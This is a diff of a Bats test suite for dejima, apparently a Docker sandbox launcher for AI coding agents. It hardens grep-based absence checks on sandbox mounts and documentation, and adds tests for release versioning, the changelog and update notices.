-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "sandbox-context probes each ecosystem once, not once per declared entry" {
@@ -6266,7 +7426,7 @@ EOF
 
 @test "README no longer documents the removed config/env flow" {
     run grep -n 'config/env\|dejima-env' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "README documents dejima-dep --global" {
@@ -6326,7 +7486,7 @@ EOF
 @test "docs/security.md says why there is no cross-project finding" {
     grep -q 'deliberately no .CROSS-PROJECT. finding' "$REPO_ROOT/docs/security.md"
     run grep -n 'CROSS-PROJECT history/memory write' "$REPO_ROOT/bin/dejima-audit"
-    [ "$status" -ne 0 ] || { echo "the finding is back but the doc says it is gone" >&2; false; }
+    [ "$status" -eq 1 ] || { echo "the finding is back but the doc says it is gone" >&2; false; }
 }
 
 # The CI disclosure is the one part of issue #72 that helps a reader whatever
@@ -6847,7 +8007,7 @@ EOF
     # first one's paths with nothing erroring anywhere. A silent wrong
     # answer, so it gets a test rather than a convention.
     run grep -rn 'config_get["'"'"' ]*harness\.[a-z]' "$REPO_ROOT/bin"
-    [ "$status" -ne 0 ] || { echo "use harness_config_get instead:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "use harness_config_get instead:"; echo "$output"; return 1; }
     grep -q '^harness_config_get()' "$REPO_ROOT/bin/dejima-provider-lib.sh"
 }
 
@@ -6902,7 +8062,7 @@ EOF
     done < <(grep -n 'dejima-epitaph' "$REPO_ROOT/bin/dejima" | grep -v '^\s*#')
     for f in "$REPO_ROOT/hooks/sandbox-context.sh" "$REPO_ROOT/bin/dejima-provider-lib.sh"; do
         run grep -n 'dejima-epitaph' "$f"
-        [ "$status" -ne 0 ] || { echo "$f reaches for epitaph: $output"; return 1; }
+        [ "$status" -eq 1 ] || { echo "$f reaches for epitaph: $output"; return 1; }
     done
 }
 
@@ -6963,6 +8123,17 @@ EOF
         || { echo "the opening pitch is $words words, budget is 100"; return 1; }
     [ "$words" -ge 30 ] \
         || { echo "the opening pitch is only $words words"; return 1; }
+
+    # The paragraph after the pitch is the same real estate, and a budget that
+    # stopped at the pitch let a sentence there grow into a paragraph of
+    # self-explanation about which harness install.sh seeds - which belongs in
+    # the install steps, where a reader meets the file. So the budget covers
+    # everything before "What bounds it:", which is where the opening ends.
+    local opening_words
+    opening_words="$(sed -n "/^\*\*Agents work best/,/^\*\*What bounds it:\*\*/p" \
+        "$REPO_ROOT/README.md" | sed '$d' | wc -w)"
+    [ "$opening_words" -le 160 ] \
+        || { echo "the whole opening is $opening_words words, budget is 160"; return 1; }
 }
 
 @test "the README's axis lists match what is shipped" {
@@ -7037,7 +8208,7 @@ EOF
     # is refused without it - but the opening paragraph still read "Claude
     # Code by default", which is the promise that change exists to not make.
     run grep -n 'Claude Code by default' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "$output"; return 1; }
     # The same promise in the Usage section's spelling, which survived the
     # first fix because it named the binary rather than the harness.
     run grep -c 'entry point is bare' <<< "$(flat_prose "$REPO_ROOT/README.md")"
@@ -7135,7 +8306,7 @@ EOF
     grep -q 'A label is not a boundary' "$REPO_ROOT/docs/ci.md"
     grep -q 'weakest runner it can reach' "$REPO_ROOT/docs/ci.md"
     run grep -n 'cannot land anywhere else' "$REPO_ROOT/docs/ci.md"
-    [ "$status" -ne 0 ] || { echo "$output" >&2; false; }
+    [ "$status" -eq 1 ] || { echo "$output" >&2; false; }
 }
 
 # The shared-identity point is what decides whether an operator's branch
@@ -7388,7 +8559,7 @@ EOF
 @test "the marker-directory check reports rather than repairs" {
     local f="$REPO_ROOT/docker/entrypoint.sh"
     run grep -nE 'chown[^|]*DEJIMA_NOTIFY_DIR|chmod[^|]*DEJIMA_NOTIFY_DIR' "$f"
-    [ "$status" -ne 0 ] || { echo "$output" >&2; false; }
+    [ "$status" -eq 1 ] || { echo "$output" >&2; false; }
     grep -q "start a new session with 'dejima'" "$f"
 }
 
@@ -7407,7 +8578,7 @@ EOF
 
 @test "sandbox-context.sh no longer mentions ALLOWED_DOMAINS" {
     run grep -n 'ALLOWED_DOMAINS' "$REPO_ROOT/hooks/sandbox-context.sh"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 # The repo is public; the operator's own network is not. Both shapes below
@@ -7528,7 +8699,7 @@ echo "$*" >> "${SANDBOX_TEST_DOCKER_LOG:-/dev/null}"
 exit 0
 EOF
     chmod +x "$DEJIMA_T/docker"
-    : > "$DEJIMA_T/sandbox-key"
+    printf "not-a-real-key\n" > "$DEJIMA_T/sandbox-key"
     chmod 600 "$DEJIMA_T/sandbox-key"
     # forge = none, workflow = local-only: provider_validate_selection runs
     # ahead of the audit-startup path these tests are actually about, and the
@@ -7989,13 +9160,13 @@ _provider_proxied_domain() {
     # it must break a test rather than silently opening the boundary.
     # ~/.local/share/nvim is mounted (a named volume); its PARENT must not be.
     run grep -nE '^\s*-\s*\$\{HOME\}/\.local/share:' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     run grep -nE '^\s*-\s*\$\{HOME\}/\.local/share/dejima' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     run grep -nE '^\s*-\s*\$\{HOME\}/\.local:' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     run grep -nE '^\s*-\s*\$\{HOME\}:' "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "every suite is run by CI, and the two that need their own job have one" {
@@ -8073,20 +9244,20 @@ _provider_proxied_domain() {
     # _briefing_core_preamble is a quoted heredoc rendered by placeholder
     # substitution; a literal $container_id would reach the agent unexpanded.
     run grep -n 'dejima-allow --container \$container_id' "$REPO_ROOT/bin/dejima-provider-lib.sh"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -q 'dejima-allow --container {{container_id}}' "$REPO_ROOT/bin/dejima-provider-lib.sh"
 }
 
 @test "README documents dejima-allow with flags before the domain" {
     grep -q 'dejima-allow --global crates.io' "$REPO_ROOT/README.md"
     run grep -nE 'dejima-allow [a-z][^ ]* +--(global|project)' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "README documents dejima-dep with flags before the spec" {
     grep -q 'dejima-dep add --global cargo:cargo-nextest' "$REPO_ROOT/README.md"
     run grep -nE 'dejima-dep (add|remove) [a-z][^ ]* +--(global|project)' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "README does not claim --global/--project patch a running session" {
@@ -8094,7 +9265,7 @@ _provider_proxied_domain() {
     # see bin/dejima-allow. Claiming otherwise sends an operator to expect a
     # live update they will not get.
     run grep -nE 'which also (updates|patches) the running session' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -q 'deliberately do not touch a running container' "$REPO_ROOT/README.md"
 }
 
@@ -8103,7 +9274,7 @@ _provider_proxied_domain() {
     # bin/dejima-project's approve case), so a failure there is a persistence
     # failure, never a live-session one.
     run grep -n 'could not apply to a running session' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
     grep -q 'never attempts to patch a running session' "$REPO_ROOT/README.md"
 }
 
@@ -8112,7 +9283,7 @@ _provider_proxied_domain() {
     # the multiple-containers ambiguity check at all - only the bare form
     # (or bare + --container) does. Only the bare form can ever refuse on it.
     run grep -n 'scope-flag) form\|scope-flag form' "$REPO_ROOT/README.md"
-    [ "$status" -ne 0 ]
+    [ "$status" -eq 1 ]
 }
 
 @test "the docs say the harness must be signed in on the host first" {
@@ -8149,7 +9320,7 @@ _provider_proxied_domain() {
     # security model becomes one per harness. The plugins are trusted code,
     # so this is held at review time rather than by isolating them.
     run grep -rn 'extra_mounts' "$REPO_ROOT/bin/harness"
-    [ "$status" -ne 0 ] || { echo "a plugin bypasses emit_mount:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "a plugin bypasses emit_mount:"; echo "$output"; return 1; }
 }
 
 @test "a harness plugin defines only hooks core actually calls" {
@@ -8203,7 +9374,7 @@ _provider_proxied_domain() {
     # bin/, hooks/, docker/ and test/ - and not the provider directories.
     [ -d "$REPO_ROOT/bin/harness" ] || { echo "plugins are not under bin/"; return 1; }
     run grep -rn 'harness_state_mounts\|harness_plugin_load' "$REPO_ROOT/harnesses"
-    [ "$status" -ne 0 ] || { echo "plugin code under harnesses/:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "plugin code under harnesses/:"; echo "$output"; return 1; }
     sed -n '/^tcb_snapshot()/,/^}/p' "$REPO_ROOT/bin/dejima-audit" | grep -q 'for dir in bin '
 }
 
@@ -8217,11 +9388,11 @@ _provider_proxied_domain() {
     local w="$SANDBOX_DIR/harness-wrapper.sh"
     [ -f "$w" ] || { echo "the generic wrapper is gone"; return 1; }
     run grep -niE 'claude|anthropic' "$w"
-    [ "$status" -ne 0 ] || { echo "the shared wrapper names a harness:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the shared wrapper names a harness:"; echo "$output"; return 1; }
     grep -q 'COPY docker/harness-wrapper.sh /usr/local/bin/dejima-harness-wrapper' \
         "$SANDBOX_DIR/Dockerfile"
     run grep -n 'COPY docker/claude-wrapper' "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ] || { echo "the old fixed-name copy is back"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the old fixed-name copy is back"; return 1; }
 }
 
 @test "the wrapper's directory beats the one npm installs the real binary into" {
@@ -8275,7 +9446,7 @@ _provider_proxied_domain() {
     # harness's command name while the manifest's own `command` key was read
     # by nothing.
     run grep -nE '^core\.command\s+identifier\s+claude' "$REPO_ROOT/bin/dejima-config-lib.sh"
-    [ "$status" -ne 0 ] || { echo "core still defaults to a harness command"; return 1; }
+    [ "$status" -eq 1 ] || { echo "core still defaults to a harness command"; return 1; }
     grep -qE '^core\.command\s+\?identifier' "$REPO_ROOT/bin/dejima-config-lib.sh"
     grep -q 'SANDBOX_CMD="$SANDBOX_HARNESS_COMMAND"' "$REPO_ROOT/bin/dejima"
 }
@@ -8310,7 +9481,7 @@ _provider_proxied_domain() {
     # every guard there is.
     grep -q '^DEJIMA_KNOWN_GUARDS=' "$REPO_ROOT/bin/dejima-provider-lib.sh"
     run grep -n '^DEJIMA_KNOWN_GUARDS=' "$REPO_ROOT/bin/dejima-harness-lib.sh"
-    [ "$status" -ne 0 ] || { echo "the set is defined in two places"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the set is defined in two places"; return 1; }
 }
 
 @test "core gates guard work on the declaration, not on the plugin defining a hook" {
@@ -8324,7 +9495,7 @@ _provider_proxied_domain() {
     # business. install.sh knowing ~/.claude/settings.json's schema is the
     # coupling; it delegates to the harness's plugin now.
     run grep -nE '\.claude/(settings\.json|hooks)' "$REPO_ROOT/install.sh"
-    [ "$status" -ne 0 ] || { echo "install.sh still writes a harness's config:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "install.sh still writes a harness's config:"; echo "$output"; return 1; }
     grep -q 'harness_register_guards' "$REPO_ROOT/install.sh"
     grep -q '^harness_register_guards()' "$REPO_ROOT/bin/harness/claude-code.sh"
 }
@@ -8348,14 +9519,14 @@ _provider_proxied_domain() {
     # are a plugin hook rather than a manifest key.
     grep -q 'HOST-CODE-EXECUTION' "$REPO_ROOT/bin/harness/claude-code.sh"
     run grep -rn 'HOST-CODE-EXECUTION' "$REPO_ROOT/harnesses"
-    [ "$status" -ne 0 ] || { echo "a finding label is manifest data:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "a finding label is manifest data:"; echo "$output"; return 1; }
     run grep -rniE 'host_exec_paths|host_exec_label' "$REPO_ROOT/harnesses" "$REPO_ROOT/bin/dejima-provider-lib.sh"
-    [ "$status" -ne 0 ] || { echo "host-exec surfaces leaked into the manifest schema:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "host-exec surfaces leaked into the manifest schema:"; echo "$output"; return 1; }
 }
 
 @test "the audit resolves host-execution paths from the harness, not a hardcoded one" {
     run grep -n 'STATUSLINE_PATH' "$REPO_ROOT/bin/dejima-audit"
-    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "$output"; return 1; }
     grep -q 'host_exec_load' "$REPO_ROOT/bin/dejima-audit"
     grep -q '^harness_host_exec_surfaces()' "$REPO_ROOT/bin/harness/claude-code.sh"
 }
@@ -8386,7 +9557,7 @@ _provider_proxied_domain() {
     # the file promises about its own provenance are dejima's.
     grep -q 'isCompactSummary' "$REPO_ROOT/bin/harness/claude-code.sh"
     run grep -n 'isCompactSummary\|compact_boundary\|\.jsonl' "$REPO_ROOT/bin/dejima-epitaph"
-    [ "$status" -ne 0 ] || { echo "the transcript format is still in core:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the transcript format is still in core:"; echo "$output"; return 1; }
     # The provenance note is dejima's promise about the artefact, so it is
     # defined once rather than phrased per harness.
     grep -q '^DEJIMA_EPITAPH_NOTE=' "$REPO_ROOT/bin/dejima-harness-lib.sh"
@@ -8407,7 +9578,7 @@ _provider_proxied_domain() {
     local f
     for f in bin/dejima-conversation-ship bin/harness/claude-code.sh; do
         run grep -nE '\$slug-\*|\$\{slug\}-\*|\$key-\*' "$REPO_ROOT/$f"
-        [ "$status" -ne 0 ] || { echo "prefix matching is back in $f:"; echo "$output"; return 1; }
+        [ "$status" -eq 1 ] || { echo "prefix matching is back in $f:"; echo "$output"; return 1; }
     done
 }
 
@@ -8421,7 +9592,7 @@ _provider_proxied_domain() {
     for f in bin/dejima-epitaph bin/dejima-conversation-ship; do
         for pat in 'projects_dir' '\.jsonl' 'messages\.json' '/sessions/'; do
             run grep -nE "$pat" "$REPO_ROOT/$f"
-            [ "$status" -ne 0 ] \
+            [ "$status" -eq 1 ] \
                 || { echo "$f still knows a harness layout ($pat):"; echo "$output"; return 1; }
         done
     done
@@ -8575,7 +9746,7 @@ _emit_mount_at() {
     # A static test already holds entrypoint.sh to the current name; nothing
     # held the docs, so they kept the old one after the rename.
     run grep -rn 'dejima-claude' "$REPO_ROOT/docs" "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "$output"; return 1; }
     grep -q 'etc/dejima-harness' "$REPO_ROOT/docs/security.md"
 }
 
@@ -8618,10 +9789,10 @@ _emit_mount_at() {
 # chosen between.
 @test "the base image installs no harness" {
     run grep -nE 'npm install -g .*(claude-code|opencode|aider)' "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ] || { echo "the Dockerfile still bakes in a harness:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the Dockerfile still bakes in a harness:"; echo "$output"; return 1; }
     # And no build arg pinning one, which is the shape it had.
     run grep -nE '^ARG .*(CLAUDE|HARNESS).*VERSION' "$SANDBOX_DIR/Dockerfile"
-    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "$output"; return 1; }
     # The Dockerfile says where the harness went, so the absence reads as a
     # decision rather than as something dropped.
     grep -qi 'harness' "$SANDBOX_DIR/Dockerfile"
@@ -8671,10 +9842,10 @@ _emit_mount_at() {
     local doc="$REPO_ROOT/docs/development.md"
     # The inventory named a RUN line and a build arg, both gone.
     run grep -nE 'npm install -g .*claude-code|CLAUDE_CODE_VERSION' "$doc"
-    [ "$status" -ne 0 ] || { echo "the inventory describes an install that is gone:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the inventory describes an install that is gone:"; echo "$output"; return 1; }
     # And the file list said the base image carries the harness.
     run grep -nE '^\| `docker/Dockerfile` \|.*[Cc]laude' "$doc"
-    [ "$status" -ne 0 ] || { echo "the file list still puts a harness in the base image:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the file list still puts a harness in the base image:"; echo "$output"; return 1; }
 }
 
 @test "every Claude Code path the base image still names has an inventory row" {
@@ -8685,7 +9856,7 @@ _emit_mount_at() {
     local dockerfile="$SANDBOX_DIR/Dockerfile"
     # Lines of actual instruction, not comments.
     run grep -nE '^[^#]*(\.claude|CLAUDE_CODE)' "$dockerfile"
-    [ "$status" -ne 0 ] \
+    [ "$status" -eq 1 ] \
         || { echo "the base image is back to naming a harness:"; echo "$output"; return 1; }
     # A row for each, naming where it is satisfied now.
     grep -q 'State directories' "$doc" || { echo "no inventory row for the state directories"; return 1; }
@@ -8705,7 +9876,8 @@ _emit_mount_at() {
     # And the other direction for the shared libraries, which are the entries
     # most easily forgotten because nothing puts them on PATH.
     for f in bin/dejima-config-lib.sh bin/dejima-color-lib.sh bin/dejima-provider-lib.sh \
-             bin/dejima-harness-lib.sh bin/dejima-tui-lib.sh docker/install-forge-bins.sh; do
+             bin/dejima-harness-lib.sh bin/dejima-tui-lib.sh bin/dejima-version-lib.sh \
+             docker/install-forge-bins.sh; do
         grep -q "\`$f\`" "$doc" || { echo "$f is shipped but not in the file list"; return 1; }
     done
 }
@@ -8718,7 +9890,7 @@ _emit_mount_at() {
     # Instruction lines only: a comment may name a harness as an example of a
     # general rule, and several do.
     run grep -nE '^[^#]*(\.claude|CLAUDE_CODE|\.aider|\.opencode)' "$d"
-    [ "$status" -ne 0 ] || { echo "the base image names a harness's paths:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the base image names a harness's paths:"; echo "$output"; return 1; }
     # .ssh still is the base image's own, so the mkdir it shares has not
     # simply been deleted along with them.
     grep -qE '^RUN mkdir -p \$SANDBOX_HOME/\.ssh' "$d"
@@ -8728,7 +9900,7 @@ _emit_mount_at() {
     # A default here decides for every harness, and names a binary an image
     # built for a different one does not contain.
     run grep -nE 'SANDBOX_CMD:-[a-z]' "$SANDBOX_DIR/entrypoint.sh" "$SANDBOX_DIR/docker-compose.yml"
-    [ "$status" -ne 0 ] || { echo "a harness is the default command:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "a harness is the default command:"; echo "$output"; return 1; }
     # Refused rather than defaulted, so an unset one says why.
     grep -q 'SANDBOX_CMD is unset' "$SANDBOX_DIR/entrypoint.sh"
 }
@@ -8736,7 +9908,7 @@ _emit_mount_at() {
 @test "the compose service and its shared volumes are named for dejima, not a harness" {
     local y="$SANDBOX_DIR/docker-compose.yml"
     run grep -nE '^\s{2}claude:|claude-code-[a-z]+:' "$y"
-    [ "$status" -ne 0 ] || { echo "a harness names the service or a volume:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "a harness names the service or a volume:"; echo "$output"; return 1; }
     grep -qE '^  sandbox:' "$y"
     # And EVERY compose invocation in bin/dejima names that same service, with
     # at least one build and one run. Counted by shape rather than pinned to a
@@ -8762,7 +9934,7 @@ _emit_mount_at() {
     # name of one API in the cert, the SAN and the /etc/hosts pin.
     local e="$SANDBOX_DIR/entrypoint.sh"
     run grep -nE '(CN=|DNS:|127\.0\.0\.1 )api\.anthropic\.com' "$e"
-    [ "$status" -ne 0 ] || { echo "the terminator is pinned to one harness's API:"; echo "$output"; return 1; }
+    [ "$status" -eq 1 ] || { echo "the terminator is pinned to one harness's API:"; echo "$output"; return 1; }
     grep -q 'SANDBOX_BACKEND_PROXIED_DOMAIN' "$e" \
         || { echo "the entrypoint does not read the declared domain"; return 1; }
     # And a proxy socket with no domain declared for it is refused, rather
@@ -8790,7 +9962,7 @@ _emit_mount_at() {
 @test "the shared entrypoint names no harness's paths" {
     local e="$SANDBOX_DIR/entrypoint.sh"
     run grep -nE '^[^#]*(\$SANDBOX_HOME|\$HOME|~)/\.(claude|aider|opencode)' "$e"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "entrypoint.sh reaches into one harness's home directory:" >&2
         echo "$output" >&2
         echo "It runs in every image, including the base one on its own." >&2
@@ -8861,7 +10033,7 @@ _emit_mount_at() {
     # cover: it changed the two helpers and left twenty per-test names alone.
     local rt="$REPO_ROOT/test/runtime.bats"
     run grep -nE 'dejima-test-[a-z-]*\$?\(?basename "\$BATS_FILE_TMPDIR"' "$rt"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "a container or image name is keyed on the file index:" >&2
         echo "$output" >&2
         return 1
@@ -8953,7 +10125,7 @@ _emit_mount_at() {
     # whichever assertions happen to depend on the harness's directories.
     local rt="$REPO_ROOT/test/runtime.bats"
     run grep -n 'export SESSION_IMAGE="\$(build_harness_layer' "$rt"
-    [ "$status" -ne 0 ] || {
+    [ "$status" -eq 1 ] || {
         echo "the layer build's failure is masked by export:" >&2; echo "$output" >&2; return 1; }
     grep -q 'session_image="$(build_harness_layer "$IMAGE")" ||' "$rt" \
         || { echo "the layer build's status is not checked"; return 1; }
@@ -9232,7 +10404,154 @@ _plain_output() { printf '%s' "$output" | sed 's/\x1b\[[0-9;]*m//g'; }
     [[ "$(_plain_output)" == *"harness claude-code"* ]] \
         && [[ "$(_plain_output)" == *"workflow local-only"* ]] \
         || { echo "the banner names no values: $output"; return 1; }
+    # The release, beside the wordmark. "which version am I running" is a
+    # question an operator should not have to go and ask, and this is where
+    # they are already looking. A checkout with no release tag says so rather
+    # than saying nothing, which would read as a banner that lost a field.
+    # Any of the three states the version library defines, because which one
+    # it is depends on the tree this suite is run from - a clone with tags, a
+    # clone without, or an unpacked tree with no .git at all. A test that
+    # accepted only one of them would be asserting something about the
+    # checkout rather than about the banner.
+    [[ "$(_plain_output)" =~ (unreleased|unknown|[0-9]{4}\.[0-9]{2}\.[0-9]{2}) ]] \
+        || { echo "the banner does not name the release: $output"; return 1; }
     rm -rf "$DEJIMA_T"
+}
+
+@test "the update notice names the release and where to read what changed" {
+    # A commit count answers "is there something newer" and nothing else. An
+    # operator deciding whether to update wants to know how far behind they
+    # are and what they would be getting, which is the whole reason for
+    # having releases at all - so the notice names both sides and the
+    # changelog, rather than leaving the file to be discovered.
+    local u="$REPO_ROOT/bin/dejima-update-check"
+    grep -q 'CHANGELOG.md' "$u" \
+        || { echo "the update notice does not name the changelog"; return 1; }
+    grep -q 'dejima_version "$REPO_ROOT"' "$u" \
+        || { echo "the notice does not say which release this checkout is on"; return 1; }
+    # Only release-shaped tags, so a tag pushed for anything else cannot
+    # become the answer to "what is the newest release".
+    grep -qF "ls-remote --tags --refs" "$u" \
+        || { echo "the remote's releases are not read from its tags"; return 1; }
+    # Through the same hardened invocation as the branch tip: the checkout's
+    # own git config must not name a command this runs, which is the whole
+    # argument at the top of that file.
+    local n
+    n="$(grep -c 'protocol.allow=never' "$u")"
+    [ "$n" = 2 ] \
+        || { echo "$n of the two remote lookups pin the allowed protocols"; return 1; }
+    # And the tags are asked for only when there is something to report, so an
+    # up-to-date checkout pays one request rather than two.
+    local flat
+    flat="$(sed -z 's/\\\n[[:space:]]*/ /g' "$u")"
+    grep -q 'if \[ -n "$tip" \] && \[ "$tip" != "$head_sha" \]; then' <<< "$flat" \
+        || { echo "the tag lookup is not conditional on there being news"; return 1; }
+}
+
+@test "the changelog says no release is supported, and has somewhere to write the next" {
+    # The risk a changelog introduces is the expectation that comes with it:
+    # a list of releases reads as a list of things one may be running, and
+    # SECURITY.md says the tip of main is the only supported version. So the
+    # file has to say so itself, where someone picking a version would be
+    # looking.
+    local c="$REPO_ROOT/CHANGELOG.md"
+    [ -f "$c" ] || { echo "there is no changelog"; return 1; }
+    grep -qi 'tip of .main. is the only supported' "$c" \
+        || { echo "the changelog does not say which version is supported"; return 1; }
+    grep -q 'SECURITY.md' "$c" \
+        || { echo "the changelog does not point at the binding statement"; return 1; }
+    # Deliberately no sweep for words like "backport" or "maintenance
+    # branch". The first version of this test had one, and it failed on the
+    # changelog's own sentence saying there are no backports - a pattern
+    # cannot tell a promise from its denial, and a test that matches the shape
+    # of prose rather than its claim is one that gets edited until it passes.
+    # The two assertions above are the claim; a reader is the only check on
+    # the rest.
+
+    # Somewhere for the next release's entry to go before its date is known.
+    # Without it an entry gets written under a guessed date, and the date is
+    # the version.
+    grep -q '^## Unreleased$' "$c" \
+        || { echo "the changelog has no Unreleased heading to write into"; return 1; }
+    # And at least one real release, named as a date, so the scheme is in the
+    # file rather than only in the process document.
+    grep -qE '^## [0-9]{4}\.[0-9]{2}\.[0-9]{2}$' "$c" \
+        || { echo "the changelog names no release as a date"; return 1; }
+    # The release process has to name both steps, because nothing fails when
+    # they are forgotten: the tag is the version, and the heading is the entry.
+    grep -q 'git tag' "$REPO_ROOT/docs/release.md" \
+        || { echo "docs/release.md does not say to tag the release"; return 1; }
+    grep -q 'Unreleased' "$REPO_ROOT/docs/release.md" \
+        || { echo "docs/release.md does not say to rename the heading"; return 1; }
+}
+
+@test "dejima --version says which release this is, and what is not supported" {
+    # Answerable without a config, like --help: the moment someone asks which
+    # release they are on is often the moment something else is wrong.
+    run env DEJIMA_CONFIG_DIR=/nonexistent "$REPO_ROOT/bin/dejima" --version
+    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
+    [[ "$output" == dejima\ * ]] \
+        || { echo "--version does not name the program: $output"; return 1; }
+    # One of the three states, for the reason the banner test gives: which it
+    # is depends on the tree this runs from, and it has to say which rather
+    # than printing nothing.
+    [[ "$output" =~ (unreleased|unknown|[0-9]{4}\.[0-9]{2}\.[0-9]{2}) ]] \
+        || { echo "--version names no release: $output"; return 1; }
+    # The two things an operator reading this needs next.
+    [[ "$output" == *CHANGELOG.md* ]] \
+        || { echo "--version does not say where the changes are: $output"; return 1; }
+    [[ "$output" == *"tip of main"* ]] \
+        || { echo "--version does not say what is supported: $output"; return 1; }
+}
+
+@test "the release a checkout is on is read from git, not from a file in the tree" {
+    # A VERSION file says what was released and goes on saying it while a
+    # checkout is pulled past that release - and the one moment the answer
+    # matters is the moment it would be wrong. So there is no such file, and
+    # the library asks git.
+    [ ! -e "$REPO_ROOT/VERSION" ] \
+        || { echo "a VERSION file is back, and it can disagree with the tags"; return 1; }
+    grep -q 'describe --tags' "$REPO_ROOT/bin/dejima-version-lib.sh" \
+        || { echo "the version library does not read the tags"; return 1; }
+
+    # Driven over every state a checkout can be in, in a throwaway repository:
+    # the answers are what --version, the banner and the update notice all
+    # print, and "unreleased" versus a date versus a date+N are three
+    # different things to tell an operator.
+    local t; t="$(mktemp -d)"
+    git -C "$t" init -q .
+    git -C "$t" config user.email t@example.invalid
+    git -C "$t" config user.name t
+    _ver() {
+        run bash -c 'source "$1"; dejima_version "$2"' _ \
+            "$REPO_ROOT/bin/dejima-version-lib.sh" "$t"
+    }
+    _ver; [ "$output" = unreleased ] \
+        || { echo "an untagged checkout reports '$output'"; rm -rf "$t"; return 1; }
+    echo one > "$t/a"; git -C "$t" add a; git -C "$t" commit -qm one
+    git -C "$t" tag 2026.10.12
+    _ver; [ "$output" = 2026.10.12 ] \
+        || { echo "on the tag it reports '$output'"; rm -rf "$t"; return 1; }
+    echo two > "$t/b"; git -C "$t" add b; git -C "$t" commit -qm two
+    _ver; [ "$output" = 2026.10.12+1 ] \
+        || { echo "one commit past the tag it reports '$output'"; rm -rf "$t"; return 1; }
+    # A tag that is not a release must not become the answer.
+    git -C "$t" tag some-marker
+    _ver; [ "$output" = 2026.10.12+1 ] \
+        || { echo "a non-release tag became the version: '$output'"; rm -rf "$t"; return 1; }
+    # And the release part of that, which is what two checkouts are compared on.
+    run bash -c 'source "$1"; dejima_version_release "2026.10.12+1"' _ \
+        "$REPO_ROOT/bin/dejima-version-lib.sh"
+    [ "$output" = 2026.10.12 ] || { echo "the release part is '$output'"; rm -rf "$t"; return 1; }
+    rm -rf "$t"
+
+    # No git at all, which is an unpacked tarball rather than a clone.
+    local plain; plain="$(mktemp -d)"
+    run bash -c 'source "$1"; dejima_version "$2"' _ \
+        "$REPO_ROOT/bin/dejima-version-lib.sh" "$plain"
+    [ "$output" = unknown ] || { echo "a non-checkout reports '$output'"; }
+    rmdir "$plain"
+    [ "$output" = unknown ]
 }
 
 @test "the startup banner is off when the config says so" {
@@ -9442,12 +10761,16 @@ _plain_output() { printf '%s' "$output" | sed 's/\x1b\[[0-9;]*m//g'; }
 }
 
 # The providers.json cline is actually given, for one config. Prints it as JSON.
+#
+# Out of the staging directory, not the state directory: this file is written
+# per run and seeded into the container now, which is what lets an isolated
+# launch - one with no state mount at all - be configured.
 _cline_providers_json() {
     local cfg="$1" out
     _cline_prepare "$cfg" "$BATS_TEST_TMPDIR/ws" >/dev/null 2>&1 || return 1
-    out="$(ls -d "$(sed -n 's/^state_dir *= *//p' "$cfg/config")"/*/settings 2>/dev/null | head -1)"
+    out="$(find "$cfg/stage" -name providers.json -print -quit 2>/dev/null)"
     [ -n "$out" ] || return 1
-    cat "$out/providers.json"
+    cat "$out"
 }
 
 @test "cline's provider type follows the provider's api_style, not a second setting" {
@@ -9794,4 +11117,716 @@ _cline_providers_json() {
     # reader choosing between them actually needs.
     [[ "$prose" == *"most miles on it"* ]] \
         || { echo "it does not say which to choose absent another reason"; return 1; }
+}
+
+# grep exits 2 for a file it could not read, which satisfies `-ne 0` just as
+# well as "the pattern is absent". The absence assertions in this suite are the
+# dangerous-thing-is-absent ones - no sudo in the Dockerfile, no docker socket
+# in compose, no ~/.ssh mount - so a renamed or moved file would turn every one
+# of them green while nothing was checked. `-eq 1` is the exit status that
